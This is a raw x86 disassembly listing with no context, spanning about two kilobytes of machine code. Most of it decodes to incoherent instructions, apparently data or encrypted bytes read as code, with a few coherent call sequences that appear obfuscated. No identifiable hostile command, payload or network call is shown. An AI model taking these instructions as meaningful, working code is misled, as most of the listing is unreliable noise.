  407a88:	xchg   BYTE PTR [edi-0x29e35a0e],dl
  407a8e:	sub    dl,ah
  407a90:	dec    ebp
  407a91:	js     0x407ac0
  407a93:	shl    DWORD PTR [eax+0x738e0d05],0x8b
  407a9a:	fs das 
  407a9c:	xor    ecx,DWORD PTR [edx-0x54]
  407a9f:	sbb    al,0x9
  407aa1:	stos   BYTE PTR es:[edi],al
  407aa2:	out    0x41,eax
  407aa4:	inc    edx
  407aa5:	jecxz  0x407a96
  407aa7:	and    ah,dh
  407aa9:	xor    DWORD PTR [eax-0x4b5f68f8],edi
  407aaf:	mov    ebx,0xcd5cff51
  407ab4:	pop    ecx
  407ab5:	int3   
  407ab6:	sub    al,dl
  407ab8:	add    BYTE PTR [esp+eiz*4-0x4b5fa117],dl
  407abf:	mov    bh,0x59
  407ac1:	jns    0x407ac3
  407ac3:	mov    eax,0xb11f497b
  407ac8:	push   ebx
  407ac9:	ins    DWORD PTR es:[edi],dx
  407aca:	iret   
  407acb:	(bad)  
  407acc:	xchg   edx,eax
  407acd:	add    BYTE PTR [esi],bh
  407acf:	call   0x7a1a:0xf5910416
  407ad6:	pusha  
  407ad7:	jmp    0x72b0:0x9242591e
  407ade:	div    BYTE PTR [edx]
  407ae0:	mov    dh,0x3a
  407ae2:	mov    bh,0x78
  407ae4:	enter  0xdd3,0x1
  407ae8:	jl     0x407a94
  407aea:	pop    ds
  407aeb:	xchg   esi,eax
  407aec:	clc    
  407aed:	push   ebx
  407aee:	or     bh,0x4b
  407af1:	std    
  407af2:	mov    bl,0xcd
  407af4:	fistp  WORD PTR [ecx+edi*1]
  407af7:	cmc    
  407af8:	sub    dh,al
  407afa:	sti    
  407afb:	jmp    0xd768:0xd4929252
  407b02:	ss inc eax
  407b04:	push   edi
  407b05:	fimul  WORD PTR cs:[edx+eiz*8-0x4a]
  407b0a:	inc    esi
  407b0b:	aas    
  407b0c:	jle    0x407b4b
  407b0e:	mov    bl,0xdd
  407b10:	pushf  
  407b11:	fidiv  DWORD PTR ds:0xc6339a97
  407b17:	add    eax,edi
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	xchg   edx,eax
  407b40:	sub    bl,BYTE PTR [ebx]
  407b42:	stos   DWORD PTR es:[edi],eax
  407b43:	push   edi
  407b44:	leave  
  407b45:	jo     0x407bb7
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407b0f
  407b4c:	sub    bh,ah
  407b4e:	repz adc dl,BYTE PTR [ebx+ebx*4-0x5386a03e]
  407b56:	mov    dl,0xc3
  407b58:	and    esi,edx
  407b5a:	xor    BYTE PTR [edi+0x49441c84],al
  407b60:	ja     0x407b26
  407b62:	sub    ah,ch
  407b64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b65:	cmp    cl,BYTE PTR [ecx+ecx*8]
  407b68:	nop
  407b69:	add    DWORD PTR [ebp+edi*4-0x17],edi
  407b6d:	xchg   ebp,eax
  407b6e:	in     eax,dx
  407b6f:	xchg   edx,eax
  407b70:	xlat   BYTE PTR ds:[ebx]
  407b72:	jg     0x407ba1
  407b74:	cmp    ah,BYTE PTR [esi-0x449e186c]
  407b7a:	mov    bl,BYTE PTR [ebp+0x1bd005c7]
  407b80:	imul   ecx,DWORD PTR [esi],0x26
  407b83:	imul   ecx,DWORD PTR [edi-0x35b178ea],0xffffffe7
  407b8a:	iret   
  407b8b:	test   ch,bl
  407b8d:	adc    ebp,eax
  407b8f:	sbb    BYTE PTR [ebp-0x7e],bl
  407b92:	mov    ds:0x215ae51f,eax
  407b97:	shl    BYTE PTR [edx],0x45
  407b9a:	fnstsw WORD PTR [ecx+esi*8-0x34]
  407b9e:	pop    ss
  407b9f:	sub    ebp,DWORD PTR [esi+0x6f]
  407ba2:	mov    bl,0xde
  407ba4:	add    DWORD PTR [ebp-0x78],eax
  407ba7:	jnp    0x407bdc
  407ba9:	mov    dl,0x14
  407bab:	stc    
  407bac:	mov    BYTE PTR [ecx+eiz*2],bh
  407baf:	push   ebx
  407bb0:	ins    BYTE PTR es:[edi],dx
  407bb1:	fcom   DWORD PTR [edi]
  407bb3:	outs   dx,BYTE PTR ds:[esi]
  407bb4:	mov    DWORD PTR [ebp-0x311e9663],ecx
  407bba:	adc    BYTE PTR [edx],bl
  407bbc:	mov    edx,0xfd44365e
  407bc1:	stos   BYTE PTR es:[edi],al
  407bc2:	test   BYTE PTR [edx],ch
  407bc4:	cmp    BYTE PTR fs:0x96845d64,bl
  407bcb:	xor    eax,0xe75508a
  407bd0:	out    dx,al
  407bd1:	mov    DWORD PTR [ebx+0x6049b170],ebx
  407bd7:	xchg   BYTE PTR [edi+0x40c15b5],dh
  407bdd:	xor    ah,BYTE PTR [edi+0x38]
  407be0:	push   edx
  407be1:	pop    ebp
  407be2:	mov    eax,0x2a7cff04
  407be7:	out    dx,eax
  407be8:	inc    edx
  407be9:	out    dx,eax
  407bea:	add    ebp,DWORD PTR gs:[eax]
  407bed:	push   0x8ca83ef6
  407bf2:	retf   
  407bf3:	(bad)  [esi-0x4b]
  407bf6:	test   BYTE PTR [edi+edx*8-0x4c],bl
  407bfa:	xor    dh,cl
  407bfc:	les    ecx,FWORD PTR [esi]
  407bfe:	or     DWORD PTR [ebp-0x4],eax
  407c01:	pop    ds
  407c02:	or     ecx,DWORD PTR [ebx+0x3bd4da94]
  407c08:	adc    ah,BYTE PTR [ecx-0x6dc1ddc9]
  407c0e:	rol    DWORD PTR [edi-0x34],cl
  407c11:	add    BYTE PTR [edx+edi*8+0x63],ch
  407c15:	dec    esp
  407c16:	pop    es
  407c17:	xchg   ebx,eax
  407c18:	test   eax,0xd3b55eca
  407c1d:	and    eax,0xc73fc647
  407c22:	fldenv [edx]
  407c24:	stc    
  407c25:	std    
  407c26:	and    al,BYTE PTR ds:0xeb81aaf3
  407c2c:	fs inc esi
  407c2e:	mov    esi,0x7e040d35
  407c33:	and    BYTE PTR [ebx-0x13d2b7e9],cl
  407c39:	jmp    0x6112:0xb15cba53
  407c40:	fidivr DWORD PTR [esi-0xbdc022b]
  407c46:	int    0x63
  407c48:	dec    edx
  407c49:	inc    eax
  407c4a:	dec    esp
  407c4b:	(bad)  
  407c4c:	xor    ah,BYTE PTR [ecx-0x6c12307e]
  407c52:	xor    al,0x2a
  407c54:	in     eax,dx
  407c55:	ins    DWORD PTR es:[edi],dx
  407c56:	xchg   ebx,eax
  407c57:	add    ah,BYTE PTR [ecx+0x5e3d34bb]
  407c5d:	adc    ch,BYTE PTR [eax-0x4]
  407c60:	test   eax,0x261c2160
  407c65:	les    esp,FWORD PTR ds:0x66beb3e6
  407c6b:	into   
  407c6c:	pop    es
  407c6d:	pop    ecx
  407c6e:	jp     0x407c5f
  407c70:	push   ebx
  407c71:	mov    BYTE PTR [ebx+0x13],dh
  407c74:	jmp    0xef4e:0xea4719ce
  407c7b:	mov    eax,ds:0x28a83682
  407c80:	mov    bl,BYTE PTR [esi]
  407c82:	bound  edx,QWORD PTR [esi]
  407c84:	jo     0x407c4a
  407c86:	jecxz  0x407c42
  407c88:	lds    eax,FWORD PTR [ebp-0x13]
  407c8b:	lock loop 0x407cf5
  407c8e:	lock mov cl,0xd7
  407c91:	(bad)  
  407c92:	sbb    eax,0xf565c42b
  407c97:	imul   ebp,DWORD PTR [eax+0x63],0x58c9b257
  407c9e:	inc    esp
  407c9f:	pop    eax
  407ca0:	mov    ebp,0x58302549
  407ca5:	push   ecx
  407ca6:	xor    al,0x14
  407ca8:	dec    ebp
  407ca9:	daa    
  407caa:	push   ecx
  407cab:	sub    BYTE PTR [ecx+esi*1+0x21],dh
  407caf:	in     eax,dx
  407cb0:	adc    ecx,ecx
  407cb2:	sub    al,0x2a
  407cb4:	inc    ecx
  407cb5:	xor    ecx,edx
  407cb7:	pop    ebx
  407cb8:	mov    bl,0x3d
  407cba:	add    BYTE PTR [ecx+esi*8-0x63],cl
  407cbe:	(bad)  
  407cbf:	popf   
  407cc0:	sbb    eax,0x87c3e4a4
  407cc5:	pop    es
  407cc6:	fwait
  407cc7:	test   edi,eax
  407cc9:	xchg   edx,eax
  407cca:	dec    edi
  407ccb:	add    BYTE PTR [esi+0x69f71a78],dl
  407cd1:	push   esp
  407cd2:	mov    ebp,0xdac2dca5
  407cd7:	repz jno 0x407d41
  407cda:	icebp  
  407cdb:	cmp    al,0x9c
  407cdd:	stc    
  407cde:	int    0x74
  407ce0:	mov    ds:0x86e39f9d,eax
  407ce5:	test   al,0xd8
  407ce7:	adc    DWORD PTR ds:0x83acbf65,ebx
  407ced:	cs add dh,al
  407cf0:	or     eax,0x98b1e0a2
  407cf5:	mov    BYTE PTR [edx-0x5a],ah
  407cf8:	jb     0x407c91
  407cfa:	out    0x96,eax
  407cfc:	std    
  407cfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cfe:	xchg   esp,eax
  407cff:	push   esp
  407d00:	aas    
  407d01:	inc    edi
  407d02:	ins    BYTE PTR es:[edi],dx
  407d03:	mov    edx,0x890d41de
  407d08:	outs   dx,BYTE PTR ds:[esi]
  407d09:	inc    esp
  407d0a:	sbb    edi,edi
  407d0c:	dec    edx
  407d0d:	sbb    eax,0xe2a72fff
  407d12:	adc    BYTE PTR [ebp-0x449fae9c],dl
  407d18:	cmp    DWORD PTR [ebx],0x9cf5ed03
  407d1e:	push   ds
  407d1f:	sbb    al,0x18
  407d21:	inc    esp
  407d22:	or     ebx,edi
  407d24:	ror    ebx,cl
  407d26:	test   BYTE PTR [edx-0x4c],ah
  407d29:	push   0x3c018f23
  407d2e:	out    dx,eax
  407d2f:	inc    esi
  407d30:	xchg   edi,eax
  407d31:	rcr    dh,0xd8
  407d34:	sbb    al,0x88
  407d36:	scas   eax,DWORD PTR es:[edi]
  407d37:	das    
  407d38:	add    BYTE PTR gs:[ebx-0x17],0xfd
  407d3d:	adc    DWORD PTR [ebx+0x2a],ecx
  407d40:	push   edx
  407d41:	aam    0x63
  407d43:	(bad)  
  407d44:	daa    
  407d45:	in     al,dx
  407d46:	call   DWORD PTR es:[edx-0x30]
  407d4a:	std    
  407d4b:	inc    ecx
  407d4c:	jbe    0x407d9a
  407d4e:	add    ebx,eax
  407d50:	sbb    DWORD PTR ds:0x5f8de697,edx
  407d56:	push   ebp
  407d57:	adc    al,0x90
  407d59:	pop    eax
  407d5a:	adc    al,BYTE PTR [ebp-0x29]
  407d5d:	dec    esi
  407d5e:	cld    
  407d5f:	enter  0x25b5,0x1
  407d63:	mov    ss,esp
  407d65:	and    dh,ah
  407d67:	ret    0xf6c4
  407d6a:	inc    ebx
  407d6b:	and    al,0xad
  407d6d:	adc    DWORD PTR [ebx],0xffffffde
  407d70:	jp     0x407d4d
  407d72:	stc    
  407d73:	bndstx [ecx+ecx*4-0x36],bnd0
  407d78:	loope  0x407d06
  407d7a:	(bad)  
  407d7b:	out    dx,al
  407d7c:	hlt    
  407d7d:	lea    ebp,[edx+eiz*8-0x2e]
  407d81:	or     al,0x75
  407d83:	stos   DWORD PTR es:[edi],eax
  407d84:	(bad)  [esi-0x33]
  407d87:	dec    eax
  407d88:	popa   
  407d89:	adc    ch,BYTE PTR ds:0x1e5a5a5c
  407d8f:	imul   DWORD PTR [ecx-0x903d17c]
  407d95:	push   edx
  407d96:	sti    
  407d97:	mov    esi,0x1d69f1df
  407d9c:	in     al,dx
  407d9d:	sub    dl,bl
  407d9f:	test   DWORD PTR [eax+0x5f],ebx
  407da2:	and    esp,edi
  407da4:	test   eax,0x787f8eac
  407da9:	dec    ebp
  407daa:	inc    ebx
  407dab:	sbb    BYTE PTR [eax],ah
  407dad:	lahf   
  407dae:	pusha  
  407daf:	jecxz  0x407d58
  407db1:	shl    BYTE PTR [eax-0x3b],1
  407db4:	mov    eax,DWORD PTR [edx-0x1]
  407db7:	xor    esp,DWORD PTR [eax*1-0x396e0d32]
  407dbe:	jg     0x407dc4
  407dc0:	(bad)  
  407dc2:	push   es
  407dc3:	mov    ch,0x35
  407dc5:	imul   esi,DWORD PTR [ebx-0x65],0x70
  407dc9:	fisttp DWORD PTR [ebx]
  407dcb:	add    edx,DWORD PTR [edx+eax*1+0x425fd679]
  407dd2:	and    eax,0xe525d9a
  407dd7:	iret   
  407dd8:	xor    al,0x74
  407dda:	fcom   st(5)
  407ddc:	mov    al,ds:0x8ef0b24a
  407de1:	pop    ebx
  407de2:	dec    esi
  407de3:	xchg   esp,eax
  407de4:	call   0x4b9d7c32
  407de9:	sub    BYTE PTR [esi],ch
  407deb:	mov    edx,0xc92e356c
  407df0:	inc    esi
  407df1:	pop    es
  407df2:	bound  esp,QWORD PTR [ebx]
  407df4:	idiv   BYTE PTR [esi]
  407df6:	das    
  407df7:	stos   DWORD PTR es:[edi],eax
  407df8:	cmp    esp,DWORD PTR [edi-0x29]
  407dfb:	add    al,0xaa
  407dfd:	hlt    
  407dfe:	into   
  407dff:	mov    cs,WORD PTR [edx]
  407e01:	jb     0x407da1
  407e03:	mov    eax,0xf268e5d9
  407e08:	ja     0x407de2
  407e0a:	jge    0x407e17
  407e0c:	dec    ebx
  407e0d:	fsubr  DWORD PTR [edx+0x2a9aa7ea]
  407e13:	add    eax,0x3a0147dc
  407e18:	and    dl,BYTE PTR [edi]
  407e1a:	mov    ch,0xa3
  407e1c:	fcom   st(5)
  407e1e:	aam    0xd7
  407e20:	mov    ds:0x84322da5,al
  407e25:	mov    WORD PTR [edi-0x42a901c0],es
  407e2b:	or     ebp,DWORD PTR [edx-0x7f]
  407e2e:	xchg   ebp,eax
  407e2f:	fsubr  QWORD PTR ds:0xcec92b95
  407e35:	mov    al,0x67
  407e37:	jecxz  0x407de1
  407e39:	xor    al,BYTE PTR [ecx]
  407e3b:	mov    ds:0x334237be,eax
  407e40:	dec    ebx
  407e41:	cmp    eax,0x54d5b2dd
  407e46:	out    0x6e,eax
  407e48:	mov    eax,0x1fb7cf02
  407e4d:	mov    esp,0x8c8739df
  407e52:	retf   
  407e53:	ins    BYTE PTR es:[edi],dx
  407e54:	sbb    BYTE PTR [edx+0x4d],dh
  407e57:	cmp    DWORD PTR [ecx+eax*8+0x58fce496],esp
  407e5e:	fdivrp st(5),st
  407e60:	jbe    0x407e18
  407e62:	push   ebx
  407e63:	outs   dx,BYTE PTR ds:[esi]
  407e64:	sub    al,bl
  407e66:	inc    ebp
  407e67:	rcl    ch,cl
  407e69:	call   0xd8a305d
  407e6e:	jb     0x407e30
  407e70:	mov    esp,0x80ac7ad9
  407e75:	push   ds
  407e76:	fs pop eax
  407e78:	xchg   sp,ax
  407e7a:	mov    ah,0xe8
  407e7c:	cmp    esp,DWORD PTR [edx+0x45890000]
  407e82:	clc    
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	or     bl,BYTE PTR [eax-0x2af875ee]
  407e9e:	jo     0x407f10
  407ea0:	and    BYTE PTR [ebp+0x70],bh
  407ea3:	jo     0x407ea6
  407ea5:	stc    
  407ea6:	jns    0x407f08
  407ea8:	mov    ch,0xca
  407eaa:	jge    0x407e53
  407eac:	retf   0x1837
  407eaf:	jecxz  0x407ee8
  407eb1:	sbb    BYTE PTR [edx-0xe5ff6aa],cl
  407eb7:	sub    al,0xc5
  407eb9:	out    0x4a,al
  407ebb:	jmp    0x47d6:0xbb8640e
  407ec2:	mov    ds:0x8f14bca3,eax
  407ec7:	pop    dx
  407ec9:	in     al,0x57
  407ecb:	xor    eax,0x89275cdb
  407ed0:	stos   DWORD PTR es:[edi],eax
  407ed1:	mov    dl,0xe8
  407ed3:	cmp    eax,0x732f2e9
  407ed8:	jle    0x407f2b
  407eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407edb:	rol    DWORD PTR [edx+0x35],0x3a
  407edf:	push   esi
  407ee0:	shl    DWORD PTR [edi],0xeb
  407ee3:	ins    DWORD PTR es:[edi],dx
  407ee4:	sbb    BYTE PTR [eax-0x11],al
  407ee7:	jo     0x407f0c
  407ee9:	loop   0x407f0d
  407eeb:	lods   eax,DWORD PTR ds:[esi]
  407eec:	repnz out 0xa8,al
  407eef:	cld    
  407ef0:	retf   
  407ef1:	add    ch,ah
  407ef3:	fsubr  QWORD PTR [ebx]
  407ef5:	mov    bh,ah
  407ef7:	(bad)  
  407ef8:	mov    BYTE PTR [esi],dh
  407efa:	xor    dh,BYTE PTR [edx-0x3730983]
  407f00:	pop    edi
  407f01:	push   ebx
  407f02:	push   0x568457ef
  407f07:	imul   ebx,DWORD PTR [eax],0xffffff86
  407f0a:	xchg   ebp,eax
  407f0b:	and    edx,ebp
  407f0d:	out    0xe0,al
  407f0f:	arpl   WORD PTR [edi+edi*4],si
  407f12:	shr    DWORD PTR [ebx],0xf
  407f15:	add    al,0x15
  407f17:	fcmovne st,st(1)
  407f19:	in     al,dx
  407f1a:	add    DWORD PTR [eax+0x1a],esi
  407f1d:	mov    cl,0xd3
  407f1f:	push   edx
  407f20:	scas   eax,DWORD PTR es:[edi]
  407f21:	mov    bl,0xf3
  407f23:	pop    es
  407f24:	push   0x9ed07e69
  407f29:	fwait
  407f2a:	xor    esi,DWORD PTR [ebx]
  407f2c:	popf   
  407f2d:	add    DWORD PTR [eax+0xb],edx
  407f30:	out    0x12,eax
  407f32:	in     al,dx
  407f33:	sub    al,0x14
  407f35:	cli    
  407f36:	and    DWORD PTR [edi+0x7242c640],0x78c49c6c
  407f40:	mov    ds:0x30bc8047,al
  407f45:	push   esp
  407f46:	jge    0x407f39
  407f48:	jbe    0x407f0c
  407f4a:	xchg   edx,eax
  407f4b:	adc    eax,0xf680ddb0
  407f50:	push   ss
  407f51:	test   eax,0x46ea3a25
  407f56:	pop    ecx
  407f57:	(bad)  
  407f58:	mov    ebp,0xfffaf861
  407f5d:	mov    ch,0x57
  407f5f:	repnz fistp QWORD PTR [eax]
  407f62:	repnz out dx,al
  407f64:	or     eax,0x7ce8df59
  407f69:	pop    edx
  407f6a:	pop    ebp
  407f6b:	call   0xd64d78ff
  407f70:	fidivr WORD PTR [edi]
  407f72:	mov    ebx,0x14ce348
  407f77:	xchg   ecx,eax
  407f78:	aam    0xac
  407f7a:	mov    BYTE PTR [edx+0x4fa8d84e],dh
  407f80:	or     BYTE PTR [ebx-0x5a],0xc9
  407f84:	sar    DWORD PTR [esi],cl
  407f86:	or     bl,cl
  407f88:	xor    eax,0x2d323547
  407f8d:	dec    ebp
  407f8e:	out    0xa6,al
  407f90:	xchg   edx,eax
  407f91:	std    
  407f92:	inc    esp
  407f93:	xchg   BYTE PTR [edi-0x34fafcca],dh
  407f99:	fidiv  DWORD PTR [ebp+0x9b32fa0]
  407f9f:	loop   0x40800b
  407fa1:	mov    eax,0x7367acc6
  407fa6:	sbb    al,0x1d
  407fa8:	xchg   esi,eax
  407fa9:	repnz mov ds:0x8bbe22c4,al
  407faf:	mov    edi,0xafee9446
  407fb4:	int    0xfe
  407fb6:	ja     0x61a822f5
  407fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fbd:	sbb    ecx,DWORD PTR [esi]
  407fbf:	popf   
  407fc0:	push   ebp
  407fc1:	aam    0x7c
  407fc3:	jge    0x407fca
  407fc5:	rol    BYTE PTR [ecx-0x25],1
  407fc8:	pop    ecx
  407fc9:	xor    eax,0x3e578b2d
  407fce:	(bad)  
  407fcf:	or     eax,0x1daf4ea6
  407fd4:	mov    ebx,0x2385bd83
  407fd9:	fisttp DWORD PTR [edi-0x51]
  407fdc:	pusha  
  407fdd:	sub    ebx,edx
  407fdf:	pop    edi
  407fe0:	or     dl,BYTE PTR [ebp-0xa75e980]
  407fe6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fe7:	sbb    DWORD PTR [ebx+0x39be3136],edx
  407fed:	rcr    BYTE PTR [ebx+eax*8],0x97
  407ff1:	test   eax,0x6d6c76bc
  407ff6:	sbb    al,0x41
  407ff8:	int3   
  407ff9:	sub    al,0xf
  407ffb:	sub    DWORD PTR [ecx],0x4
  407ffe:	add    esp,ebp
  408000:	test   eax,0x2cf7c21d
  408005:	sub    ah,BYTE PTR [ebp-0x4e69b98]
  40800b:	adc    al,0xd0
  40800d:	paddb  mm3,QWORD PTR [edx+0x2d]
  408011:	out    0xda,al
  408013:	pop    edx
  408014:	(bad)  
  408015:	pop    ds
  408016:	mov    fs,WORD PTR [ebp+eax*8+0x43983095]
  40801d:	cmp    edx,DWORD PTR [edx]
  40801f:	xchg   edx,eax
  408020:	mov    fs,WORD PTR [esi]
  408022:	and    BYTE PTR ds:0x1eb94d36,0xb9
  408029:	dec    ecx
  40802a:	adc    al,al
  40802c:	(bad)  
  40802d:	in     eax,dx
  40802e:	dec    eax
  40802f:	adc    edi,esi
  408031:	cli    
  408032:	scas   eax,DWORD PTR es:[edi]
  408033:	inc    esi
  408034:	cmp    al,0xf4
  408036:	test   DWORD PTR [ebp+0x14e23e9d],eax
  40803c:	jb     0x408031
  40803e:	adc    DWORD PTR [edi-0x20f6c678],0x50
  408045:	pop    eax
  408046:	shl    DWORD PTR [ebx],cl
  408048:	sub    edx,DWORD PTR [esi+ebp*4+0x15]
  40804c:	mov    ss,WORD PTR [ebp+0x1b]
  40804f:	popf   
  408050:	sub    eax,0x251b518b
  408055:	add    DWORD PTR ds:0x4ef6e048,edi
  40805b:	clc    
  40805c:	(bad)  
  40805d:	shr    BYTE PTR [esi],1
  40805f:	fsub   QWORD PTR [ebp+0x59]
  408062:	lahf   
  408063:	dec    ebp
  408064:	leave  
  408065:	loopne 0x40800d
  408067:	lahf   
  408068:	(bad)  
  408069:	imul   ebx,DWORD PTR [esi-0x6e7d622d],0x14a54e6e
  408073:	jge    0x4080c9
  408075:	imul   esi,eax,0x209015ea
  40807b:	inc    esi
  40807c:	jo     0x408005
  40807e:	jge    0x408055
  408080:	adc    eax,0x5d09d36c
  408085:	inc    ebp
  408086:	int3   
  408087:	lahf   
  408088:	les    esp,FWORD PTR [ebx]
  40808a:	dec    ebx
  40808b:	sub    eax,0x8e3b0ead
  408090:	sub    eax,0xfcb2a3dc
  408095:	ret    0x5c33
  408098:	popa   
  408099:	mov    al,ch
  40809b:	or     BYTE PTR [ebp+esi*8-0x7b],bl
  40809f:	push   esi
  4080a0:	jle    0x408077
  4080a2:	mov    ds:0xcb96b3e7,eax
  4080a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080a8:	aaa    
  4080a9:	sbb    al,BYTE PTR [ebx+0x356c739a]
  4080af:	pop    edi
  4080b0:	scas   al,BYTE PTR es:[edi]
  4080b1:	shl    DWORD PTR ds:0xa7bae64b,1
  4080b7:	push   edi
  4080b8:	push   es
  4080b9:	hlt    
  4080ba:	out    dx,al
  4080bb:	sbb    edx,edi
  4080bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080be:	jns    0x408126
  4080c0:	adc    ch,BYTE PTR [esi-0x2147a360]
  4080c6:	test   dh,bl
  4080c8:	ja     0x4080e8
  4080ca:	mov    WORD PTR [edi],ds
  4080cc:	ins    BYTE PTR es:[edi],dx
  4080cd:	fcmovnb st,st(7)
  4080cf:	fldenv [edx-0xd]
  4080d2:	imul   edx,DWORD PTR [ecx+0x1a],0x38c2961a
  4080d9:	pusha  
  4080da:	enter  0x6870,0x9
  4080de:	cmp    esi,DWORD PTR [ebx-0x36048b80]
  4080e4:	push   es
  4080e5:	xchg   esp,eax
  4080e6:	inc    esp
  4080e7:	rol    cl,1
  4080e9:	bound  ebx,QWORD PTR [esi+0x79]
  4080ec:	fild   DWORD PTR [ecx+0x60a96714]
  4080f2:	xor    ebx,ebx
  4080f4:	mov    ds:0xc88be163,eax
  4080f9:	jae    0x408099
  4080fb:	pop    eax
  4080fc:	sub    al,0x52
  4080fe:	push   edx
  4080ff:	out    dx,eax
  408100:	dec    ebp
  408101:	pop    ebp
  408102:	outs   dx,BYTE PTR ds:[esi]
  408103:	stos   BYTE PTR es:[edi],al
  408104:	lds    esi,FWORD PTR [edi+0x755450a4]
  40810a:	in     eax,dx
  40810b:	xchg   DWORD PTR [edi],edx
  40810d:	jle    0x4080d9
  40810f:	or     BYTE PTR [ebp-0x5],0xea
  408113:	imul   esp,DWORD PTR [eax],0xffffffbe
  408116:	inc    ebp
  408117:	add    al,BYTE PTR [ecx-0x2d3be679]
  40811d:	inc    edi
  40811e:	push   ecx
  40811f:	mov    edx,0x55b25cbe
  408124:	jl     0x40818a
  408126:	adc    BYTE PTR [edx-0x16ed0c27],bh
  40812c:	(bad)  
  40812d:	je     0x40813d
  40812f:	arpl   WORD PTR [eax+0x6a6e88c4],bp
  408135:	out    0x5,al
  408137:	dec    ebp
  408138:	push   esp
  408139:	xor    dl,BYTE PTR [ebp+0xa7d6eb]
  40813f:	jb     0x4080fb
  408141:	dec    edx
  408142:	xchg   ecx,eax
  408143:	push   es
  408144:	and    ecx,DWORD PTR [ebp-0x1d2ac869]
  40814a:	in     al,0xad
  40814c:	jae    0x4080d3
  40814e:	fistp  DWORD PTR [edi+esi*1-0x1ed7277b]
  408155:	push   ebp
  408156:	mov    ebx,0x9a630ec
  40815b:	xor    bl,dl
  40815d:	rol    DWORD PTR [edx],cl
  40815f:	pop    esp
  408160:	test   al,0xf1
  408162:	jle    0x4081d8
  408164:	mov    ch,0x29
  408166:	imul   edx,DWORD PTR [ebx+0x67],0x64
  40816a:	mov    al,0xc
  40816c:	cmp    dh,BYTE PTR [ebx]
  40816e:	in     al,dx
  40816f:	into   
  408170:	sbb    dl,BYTE PTR [ecx]
  408172:	push   ss
  408173:	mov    eax,0x627b49d
  408178:	test   eax,0x921aec8a
  40817d:	mov    ebx,edx
  40817f:	out    dx,al
  408180:	ja     0x40819e
  408182:	popa   
  408183:	xlat   BYTE PTR ds:[ebx]
  408184:	imul   ebp,DWORD PTR [ebx-0x13],0x73cd370c
  40818b:	stc    
  40818c:	mov    al,0xe7
  40818e:	mov    esp,DWORD PTR [edx]
  408190:	fcmovu st,st(6)
  408192:	inc    esp
  408193:	pop    esp
  408194:	lea    edi,[edx+0xcaf1bcc]
  40819a:	shr    DWORD PTR [ebx+0x20651f1c],0x2a
  4081a1:	pop    ecx
  4081a2:	aas    
  4081a3:	(bad)  
  4081a4:	retf   0x21cc
  4081a7:	pop    edx
  4081a8:	inc    ecx
  4081a9:	mov    eax,0x42a2fc4d
  4081ae:	xchg   dl,bh
  4081b0:	add    DWORD PTR [esi],esi
  4081b2:	test   DWORD PTR gs:[edx-0x3f],ecx
  4081b6:	stos   DWORD PTR es:[edi],eax
  4081b7:	rcl    DWORD PTR [edi+0x6af94480],0xa1
  4081be:	daa    
  4081bf:	jo     0x408229
  4081c1:	mov    WORD PTR [edi+0x1fc462e2],ds
  4081c7:	mov    ds:0x8fda1699,eax
  4081cc:	data16 test al,0xab
  4081cf:	pop    edi
  4081d0:	sub    bl,ah
  4081d2:	pop    ds
  4081d3:	test   eax,0x8904458d
  4081d8:	inc    ebp
  4081d9:	loopne 0x4081ea
  4081db:	test   BYTE PTR [esp+edx*1+0x458d0000],cl
  4081e2:	call   0xd4860d37
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	ins    BYTE PTR es:[edi],dx
  408269:	adc    ebx,DWORD PTR [esi]
